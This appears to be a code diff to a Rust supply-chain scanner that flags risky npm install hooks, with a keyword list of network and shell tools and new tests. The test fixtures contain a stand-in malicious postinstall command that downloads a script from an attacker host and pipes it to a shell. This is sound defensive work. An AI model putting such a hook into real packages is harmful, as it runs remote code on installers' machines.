@@ -9,6 +9,7 @@ use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, Artifact
 use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
 };
+use crate::services::artifact_orchestration::network::extract_http_urls;
 use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};
 
 use super::NPM_INSTALL_HOOKS;
@@ -72,22 +73,7 @@ pub(crate) fn analyze_package_json(
     if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
         for hook in NPM_INSTALL_HOOKS {
             if let Some(command) = scripts.get(*hook).and_then(Value::as_str) {
-                let lower_command = command.to_ascii_lowercase();
-                let risky_install_hook = [
-                    "curl ",
-                    "wget ",
-                    "http://",
-                    "https://",
-                    "powershell",
-                    "invoke-webrequest",
-                    "iwr ",
-                    "bash -c",
-                    "sh -c",
-                    "python -c",
-                    "node -e",
-                ]
-                .iter()
-                .any(|needle| lower_command.contains(needle));
+                let risky_install_hook = package_json_install_hook_is_risky(command);
                 findings.push(
                     Finding::builder(
                         "MANIFEST_PACKAGE_JSON_INSTALL_HOOK",
@@ -163,17 +149,29 @@ pub(crate) fn package_json_capabilities(content: &str) -> Vec<ArtifactCapability
     };
 
     let mut capabilities = Vec::new();
+    let mut has_install_hook = false;
+    let mut has_network_hook = false;
 
     if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
-        if NPM_INSTALL_HOOKS
-            .iter()
-            .any(|hook| scripts.contains_key(*hook))
-        {
+        for hook in NPM_INSTALL_HOOKS {
+            let Some(command) = scripts.get(*hook).and_then(Value::as_str) else {
+                continue;
+            };
+            has_install_hook = true;
+            has_network_hook |= package_json_install_hook_has_network(command);
+        }
+
+        if has_install_hook {
             capabilities.push(ArtifactOrchestratorService::declared_capability(
                 ArtifactCapability::InstallExecution,
             ));
             capabilities.push(ArtifactOrchestratorService::declared_capability(
                 ArtifactCapability::ProcessExecution,
+            ));
+        }
+        if has_network_hook {
+            capabilities.push(ArtifactOrchestratorService::observed_capability(
+                ArtifactCapability::NetworkAccess,
             ));
         }
     }
@@ -185,6 +183,28 @@ pub(crate) fn package_json_capabilities(content: &str) -> Vec<ArtifactCapability
     }
 
     capabilities
+}
+
+fn package_json_install_hook_is_risky(command: &str) -> bool {
+    let lower_command = command.to_ascii_lowercase();
+    package_json_install_hook_has_network(command)
+        || ["powershell", "bash -c", "sh -c", "python -c", "node -e"]
+            .iter()
+            .any(|needle| lower_command.contains(needle))
+}
+
+fn package_json_install_hook_has_network(command: &str) -> bool {
+    let lower_command = command.to_ascii_lowercase();
+    [
+        "curl ",
+        "wget ",
+        "http://",
+        "https://",
+        "invoke-webrequest",
+        "iwr ",
+    ]
+    .iter()
+    .any(|needle| lower_command.contains(needle))
 }
 
 /// Whether a `package.json` dependency version specifier is anything
@@ -337,6 +357,20 @@ pub(crate) fn package_json_relations(content: &str) -> Vec<ArtifactLink> {
                     target: command.to_string(),
                     relation: ArtifactRelation::Executes,
                 });
+                if package_json_install_hook_has_network(command) {
+                    let urls = extract_http_urls(command);
+                    if urls.is_empty() {
+                        links.push(ArtifactLink {
+                            target: "remote-resource".to_string(),
+                            relation: ArtifactRelation::Downloads,
+                        });
+                    } else {
+                        links.extend(urls.into_iter().map(|url| ArtifactLink {
+                            target: url,
+                            relation: ArtifactRelation::Downloads,
+                        }));
+                    }
+                }
             }
         }
     }
@@ -353,6 +387,12 @@ mod tests {
 
     fn finding_present(findings: &[Finding], rule_id: &str) -> bool {
         findings.iter().any(|finding| finding.rule_id == rule_id)
+    }
+
+    fn download_relation_target_present(links: &[ArtifactLink], target: &str) -> bool {
+        links.iter().any(|link| {
+            matches!(link.relation, ArtifactRelation::Downloads) && link.target == target
+        })
     }
 
     /// Contract: `bin: null` carries no executable; capability and finding must NOT fire.
@@ -468,6 +508,58 @@ mod tests {
                 "hook `{hook}` must declare ProcessExecution",
             );
         }
+    }
+
+    /// Contract: install hooks that fetch over HTTP(S) carry network
+    /// behavior in the artifact graph, not only execution behavior.
+    #[test]
+    fn package_json_capabilities_adds_network_for_fetching_install_hook() {
+        let manifest =
+            r#"{"name":"x","scripts":{"postinstall":"curl HTTPS://attacker.example/p.sh | sh"}}"#;
+
+        let caps = package_json_capabilities(manifest);
+
+        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
+    }
+
+    /// Contract: a plain install hook is execution, not network access.
+    #[test]
+    fn package_json_capabilities_skips_network_for_plain_install_hook() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"node bootstrap.js"}}"#;
+
+        let caps = package_json_capabilities(manifest);
+
+        assert!(!capability_present(
+            &caps,
+            ArtifactCapability::NetworkAccess
+        ));
+    }
+
+    /// Contract: install-hook URLs become Downloads edges for taint and
+    /// capability-combo analysis.
+    #[test]
+    fn package_json_relations_records_download_urls_for_fetching_install_hook() {
+        let manifest =
+            r#"{"name":"x","scripts":{"postinstall":"curl HTTPS://attacker.example/p.sh | sh"}}"#;
+
+        let links = package_json_relations(manifest);
+
+        assert!(download_relation_target_present(
+            &links,
+            "HTTPS://attacker.example/p.sh"
+        ));
+    }
+
+    /// Contract: plain install hooks do not invent Downloads edges.
+    #[test]
+    fn package_json_relations_skips_download_for_plain_install_hook() {
+        let manifest = r#"{"name":"x","scripts":{"postinstall":"node bootstrap.js"}}"#;
+
+        let links = package_json_relations(manifest);
+
+        assert!(!links
+            .iter()
+            .any(|link| matches!(link.relation, ArtifactRelation::Downloads)));
     }
 
     /// Contract: a `bin` field that is whitespace-only is a no-op for npm
